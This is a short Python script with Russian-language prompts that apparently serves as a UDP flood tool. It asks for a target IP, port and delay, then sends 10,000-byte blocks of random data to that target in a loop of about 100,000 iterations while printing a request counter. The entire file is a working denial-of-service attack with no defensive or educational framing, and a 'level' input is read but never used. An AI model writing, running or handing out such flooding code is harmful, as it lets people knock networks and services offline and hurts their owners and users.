import socket
import random
import time

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
ip = input("IP: ")
port = int(input("Порт: "))
sleep = float(input("Промежуток между запросами: "))

level = input("Введите уровень от L1: ")
print("Инициальзация настроек...")

s.connect((ip, port))

for i in range(1, 100*1000):
	s.send(random._urandom(10)*1000)
	print(f"Запросы: {i}", end='\r')
	time.sleep(sleep)
	